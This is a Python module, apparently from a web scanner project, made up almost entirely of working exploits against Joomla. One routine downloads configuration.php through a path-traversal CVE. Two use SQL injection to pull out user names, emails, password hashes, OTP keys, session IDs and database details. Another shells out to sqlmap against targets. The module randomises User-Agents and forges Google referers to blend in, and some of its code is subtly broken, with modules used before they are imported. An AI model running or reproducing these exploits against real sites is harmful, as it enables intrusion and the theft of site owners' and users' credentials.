# Copyright (c) 2024 waymap developers
# See the file 'LICENSE' for copying permission.
# jm.py profile critical
from __future__ import print_function
from colorama import Fore, Style, init
init(autoreset=True)

# CVE-2017-18345 EXPLOIT START

import urllib.request as urllib2
from bs4 import BeautifulSoup
import urllib.parse as urlparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class TerminalColors:
    red = '\033[31m'
    green = '\033[32m'
    blue = '\033[34m'
    cyan = '\033[36m'
    purple = '\033[35m'
    yellow = '\033[33m'
    white = '\033[37m'
    default = '\033[0m'

def exploit_cve_2017_18345(profile_url):
    try:
        download_path = "index.php?option=com_joomanager&controller=details&task=download&path=configuration.php"
        full_url = profile_url.rstrip('/') + '/' + download_path

        try:
            base_url = urlparse.urlparse(profile_url).path
            clean_url = profile_url.replace(base_url, "")
            response = requests.get(clean_url, verify=False)
        except Exception as e:
            print(TerminalColors.red + "[!] Error while accessing clean URL: " + str(e))
            return False

        file_response = urllib2.urlopen(full_url)
        soup = BeautifulSoup(response.content.decode('utf-8', 'ignore'), 'html.parser')
        page_title = soup.title.text if soup.title else "downloaded_file"
        sanitized_title = "".join(c for c in page_title if c.isalnum() or c in (' ', '_')).rstrip()

        with open(f"{sanitized_title}.php", "wb") as file:
            file.write(file_response.read())

        print(TerminalColors.green + "[*] Exploit Successful:")
        print(TerminalColors.cyan + "[*] Target: " + clean_url)
        print(TerminalColors.cyan + "[*] Page Title: " + page_title)
        print(TerminalColors.yellow + f"[*] File Saved as: {sanitized_title}.php")
        print(TerminalColors.cyan + "[*] Exploit Path: " + download_path)

        return True 

    except Exception as e:
        print(TerminalColors.red + "[!] Exploit failed for Target: " + profile_url)
        print(TerminalColors.red + "Error: " + str(e))
        return False 

def scan_cve_2017_18345(profile_url):
    print(TerminalColors.green + "[*] Starting Exploit..." + TerminalColors.default)
    success = exploit_cve_2017_18345(profile_url)

    if success:
        print(TerminalColors.green + "[*] Exploit Complete" + TerminalColors.default)
    else:
        print(TerminalColors.red + "[*] Exploit Failed" + TerminalColors.default)
    
    return success 

# CVE-2017-18345 EXPLOIT END 

# CVE-2017-8917 EXPLOIT STARTS

import binascii


def extract_csrf_token_8917(response):
    match = re.search(r'name="([a-f0-9]{32})" value="1"', response.text, re.S)
    if match is None:
        print("[~] Unable to find CSRF token.")
        return None
    return match.group(1)

def build_sqli_query_8917(column_name, additional_query):
    return f"(SELECT {column_name} {additional_query})"

def joomla_sqli_data_extraction_8917(session, token, profile_url, column_name, additional_query):
    sqli = build_sqli_query_8917(f"LENGTH({column_name})", additional_query)
    length = perform_sqli_8917(session, token, profile_url, sqli)
    if not length:
        return None
    length = int(length)
    offset = 0
    extracted_data = ''
    while length > offset:
        sqli = build_sqli_query_8917(f"HEX(MID({column_name},{offset + 1},16))", additional_query)
        value = perform_sqli_8917(session, token, profile_url, sqli)
        if not value:
            print("[~] Failed to retrieve data from query:", sqli)
            return None
        value = binascii.unhexlify(value).decode("utf-8")
        extracted_data += value
        offset += len(value)
    return extracted_data

def perform_sqli_8917(session, token, profile_url, sqli):
    sqli_full = f"UpdateXML(2, concat(0x3a,{sqli}, 0x3a), 1)"
    data = {
        'option': 'com_fields',
        'view': 'fields',
        'layout': 'modal',
        'list[fullordering]': sqli_full,
        token: '1',
    }
    response = session.get(f"{profile_url}/index.php?option=com_fields&view=fields&layout=modal", params=data, allow_redirects=False, verify=False)
    match = re.search(r'XPATH syntax error:\s*&#039;([^$\n]+)\s*&#039;\s*</bl', response.text, re.S)
    if match:
        match = match.group(1).strip()
        if match[0] != ':' and match[-1] != ':':
            return None
        return match[1:-1]

def extract_joomla_table_names_8917(session, token, profile_url):
    tables = []
    offset = 0
    print("[~] Starting table extraction...")
    while True:
        result = joomla_sqli_data_extraction_8917(session, token, profile_url, "TABLE_NAME", f"FROM information_schema.tables WHERE TABLE_NAME LIKE 0x257573657273 LIMIT {offset},1")
        if result is None:
            break
        tables.append(result)
        print(f"[~] Found table: {result}")
        offset += 1
    return tables

def extract_joomla_users_8917(session, token, profile_url, table_name):
    users = []
    offset = 0
    print(f"[~] Extracting users from table: {table_name}")
    while True:
        result = joomla_sqli_data_extraction_8917(session, token, profile_url, "CONCAT(id,0x7c,name,0x7c,username,0x7c,email,0x7c,password,0x7c,otpKey,0x7c,otep)", f"FROM {table_name} ORDER BY registerDate ASC LIMIT {offset},1")
        if result is None:
            break
        result = result.split('|')
        print(f"[~] Found user: {result}")
        users.append(result)
        offset += 1
    return users

def extract_joomla_sessions_8917(session, token, profile_url, table_name):
    sessions = []
    offset = 0
    print(f"[~] Extracting sessions from table: {table_name}")
    while True:
        result = joomla_sqli_data_extraction_8917(session, token, profile_url, "CONCAT(userid,0x7c,session_id,0x7c,username)", f"FROM {table_name} WHERE guest = 0 LIMIT {offset},1")
        if result is None:
            break
        result = result.split('|')
        print(f"[~] Found session: {result}")
        sessions.append(result)
        offset += 1
    return sessions

def run_cve_2017_8917_exploit(profile_url):
    session = requests.Session()

    print("[~] Fetching CSRF token from the login page.")
    response = session.get(f"{profile_url}/index.php/component/users/?view=login", verify=False)
    token = extract_csrf_token_8917(response)
    if not token:
        return False

    print("[~] Verifying SQL injection.")
    sqli_test_result = perform_sqli_8917(session, token, profile_url, "128+127")
    if sqli_test_result != "255":
        print("[~] SQL injection test failed.")
        return False

    print("[~] Extracting Joomla database tables.")
    tables = extract_joomla_table_names_8917(session, token, profile_url)

    for table_name in tables:
        table_prefix = table_name[:-5]
        extract_joomla_users_8917(session, token, profile_url, table_name)
        extract_joomla_sessions_8917(session, token, profile_url, f"{table_prefix}session")

    return True

def scan_cve_2017_8917(profile_url):
    run_cve_2017_8917_exploit(profile_url)

# CVE-2017-8917 EXPLOIT END 

# CVE-2018-6396 EXPLOIT STARTS

import os
import random
import requests
from urllib.parse import urljoin

class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    WHITE = '\033[37m'

class UserAgent:
    agent = {}

    def random(self):
        self.get_platform()
        self.get_os()
        self.get_browser()

        if self.agent['browser'] == 'Chrome':
            webkit = str(random.randint(500, 599))
            version = "%s.0%s.%s" % (str(random.randint(0, 24)), str(random.randint(0, 1500)), str(random.randint(0, 999)))
            return f"Mozilla/5.0 ({self.agent['os']}) AppleWebKit/{webkit}.0 (KHTML, like Gecko) Chrome/{version} Safari/{webkit}"
        elif self.agent['browser'] == 'Firefox':
            year = str(random.randint(2000, 2015))
            month = str(random.randint(1, 12)).zfill(2)
            day = str(random.randint(1, 28)).zfill(2)
            gecko = f"{year}{month}{day}"
            version = f"{str(random.randint(1, 15))}.0"
            return f"Mozilla/5.0 ({self.agent['os']}; rv:{version}) Gecko/{gecko} Firefox/{version}"
        elif self.agent['browser'] == 'IE':
            version = f"{str(random.randint(1, 10))}.0"
            engine = f"{str(random.randint(1, 5))}.0"
            token = random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) if random.choice([True, False]) else ''
            return f"Mozilla/5.0 (compatible; MSIE {version}; {self.agent['os']}; {token} Trident/{engine})"

    def get_os(self):
        if self.agent['platform'] == 'Machintosh':
            self.agent['os'] = random.choice(['68K', 'PPC'])
        elif self.agent['platform'] == 'Windows':
            self.agent['os'] = random.choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win95', 'Win98', 'Win 9x 4.90', 'WindowsCE'])
        elif self.agent['platform'] == 'X11':
            self.agent['os'] = random.choice(['Linux i686', 'Linux x86_64'])

    def get_browser(self):
        self.agent['browser'] = random.choice(['Chrome', 'Firefox', 'IE'])

    def get_platform(self):
        self.agent['platform'] = random.choice(['Machintosh', 'Windows', 'X11'])

UA = UserAgent()
P = "/index.php?option=com_gmap&view=gm_modal&tmpl=component&layout=default&map=1"

def randomString(size):
    return ''.join(chr(random.randint(65, 90)) for _ in range(size))

def isVulnerable6396(profile_url):
    global UA
    url = urljoin(profile_url, P)

    headers = {
        'User-Agent': UA.random(),
        'Cache-Control': 'no-cache',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Referer': 'http://www.google.com/?q=' + randomString(random.randint(5, 10)),
        'Keep-Alive': str(random.randint(110, 120)),
        'Connection': 'keep-alive'
    }

    print(Colors.BOLD + Colors.GREEN + f"[+]" + " Checking if " + Colors.YELLOW + profile_url + Colors.GREEN + " is vulnerable" + Colors.ENDC)
    
    try:
        response = requests.get(url, headers=headers, timeout=10, verify=False)
        if response.status_code == 200:
            return True
    except Exception as e:
        print(f"{Colors.RED}Error: {str(e)}{Colors.ENDC}")
    
    return False

def scan_cve_2018_6396(profile_url):
    if isVulnerable6396(profile_url):
        print(Colors.BOLD + Colors.GREEN + "[+]" + " TARGET " + Colors.YELLOW + profile_url + Colors.GREEN + " VULNERABLE!! :)" + Colors.ENDC)
        print(Colors.BOLD + Colors.GREEN + "[+]" + " LAUNCHING ATTACK SQLi with SQLmap!!" + Colors.ENDC)
        exploit_command = f'sqlmap -u "{profile_url + P}" -p map --dbs'
        os.system(exploit_command)
        return True
    else:
        print(Colors.BOLD + Colors.RED + "[-]" + " TARGET " + Colors.YELLOW + profile_url + Colors.RED + " NOT VULNERABLE!! :(" + Colors.ENDC)
        return False

# CVE-2018-6396 EXPLOIT END 

# CVE-2018-17254 EXPLOIT STARTS

import re
import base64 
from termcolor import colored

def green(text): return f"\033[92m{text}\033[0m"
def red(text): return f"\033[91m{text}\033[0m"
def yellow(text): return f"\033[93m{text}\033[0m"
def cyan(text): return f"\033[96m{text}\033[0m"
def bold(text): return f"\033[1m{text}\033[0m"

vuln_file = '/editors/jckeditor/plugins/jtreelink/dialogs/links.php'

def payload_17254(str1, str2=""):
    return f'?extension=menu&view=menu&parent="%20UNION%20SELECT%20NULL,NULL,{str1},NULL,NULL,NULL,NULL,NULL{str2}--%20aa'

def get_request_17254(profile_url):
    response = requests.get(profile_url, verify=False)
    return response.text

def inject_17254(profile_url, payload):
    global vuln_file
    request_profile_url = profile_url + vuln_file + payload
    response = get_request_17254(request_profile_url)
    matches = re.findall(r'profile_url ="(.*)">', response)
    return matches

def is_vulnerable_17254(profile_url):
    output = inject_17254(profile_url, payload_17254("0x6861636b6564")) 
    if output and base64.b64encode(output[0].encode()).decode() == "aGFja2Vk":  
        return True
    return False

def get_db_names_17254(profile_url):
    db_names = []
    output = inject_17254(profile_url, payload_17254("schema_name", "%20from%20information_schema.schemata"))
    db_names.extend(output)
    return db_names

def get_table_names_17254(profile_url, db):
    table_names = []
    output = inject_17254(profile_url, payload_17254("table_name", f"%20from%20information_schema.tables%20WHERE%20table_schema='{db}'"))
    table_names.extend(output)
    return table_names

def scan_cve_2018_17254(profile_url):
    print(colored("[+] Checking if target is vulnerable...", "cyan", attrs=["bold"]))
    
    if is_vulnerable_17254(profile_url):
        main_db = inject_17254(profile_url, payload_17254("database()"))[0]
        hostname = inject_17254(profile_url, payload_17254("@@hostname"))[0]
        mysql_user = inject_17254(profile_url, payload_17254("user()"))[0]
        mysql_version = inject_17254(profile_url, payload_17254("@@version"))[0]
        connection_id = inject_17254(profile_url, payload_17254("connection_id()"))[0]
        
        print(colored("[+] Target is vulnerable! =)\n", "green", attrs=["bold"]))
        print(colored("[i] Hostname: ", "cyan", attrs=["bold"]) + colored(hostname, "yellow", attrs=["bold"]))
        print(colored("[i] Current database: ", "cyan", attrs=["bold"]) + colored(main_db, "yellow", attrs=["bold"]))
        print(colored("[i] MySQL version: ", "cyan", attrs=["bold"]) + colored(mysql_version, "yellow", attrs=["bold"]))
        print(colored("[i] MySQL user: ", "cyan", attrs=["bold"]) + colored(mysql_user, "yellow", attrs=["bold"]))
        print(colored("[i] Connection ID: ", "cyan", attrs=["bold"]) + colored(connection_id, "yellow", attrs=["bold"]))
        
        print(colored("[+] Getting DB names...", "cyan", attrs=["bold"]))
        dbs = get_db_names_17254(profile_url)
        for db in dbs:
            print(colored(f"[+] DB found: {db}", "green", attrs=["bold"]))
    else:
        print(colored("[-] Target is not vulnerable.", "red", attrs=["bold"]))
        return False

# CVE-2018-17254 EXPLOIT ENDS

def handle_cve_2018_6396(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[+] Starting scan for {Fore.YELLOW}CVE-2018_6396 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")
        scan_cve_2018_6396(profile_url)
        print(f"{Fore.CYAN}[-] Completed scan for {Fore.YELLOW}CVE-2018_6396 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan for {Fore.YELLOW}CVE-2018_6396 {Fore.RED}interrupted. Moving to next CVE...{Style.RESET_ALL}")
        return
def handle_cve_2018_17254(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[+] Starting scan for {Fore.YELLOW}CVE-2018_17254 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")
        scan_cve_2018_17254(profile_url)
        print(f"{Fore.CYAN}[-] Completed scan for {Fore.YELLOW}CVE-2018_17254 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan for {Fore.YELLOW}CVE-2018_17254 {Fore.RED}interrupted. Moving to next CVE...{Style.RESET_ALL}")
        return
def handle_cve_2017_18345(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[+] Starting scan for {Fore.YELLOW}CVE-2017_18345 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")
        scan_cve_2017_18345(profile_url)
        print(f"{Fore.CYAN}[-] Completed scan for {Fore.YELLOW}CVE-2017_18345 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan for {Fore.YELLOW}CVE-2017_18345 {Fore.RED}interrupted. Moving to next CVE...{Style.RESET_ALL}")
        return
def handle_cve_2017_8917(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[+] Starting scan for {Fore.YELLOW}CVE-2017_8917 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")
        scan_cve_2017_8917(profile_url)
        print(f"{Fore.CYAN}[-] Completed scan for {Fore.YELLOW}CVE-2017_8917 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan for {Fore.YELLOW}CVE-2017_8917 {Fore.RED}interrupted. Moving to next CVE...{Style.RESET_ALL}")
        return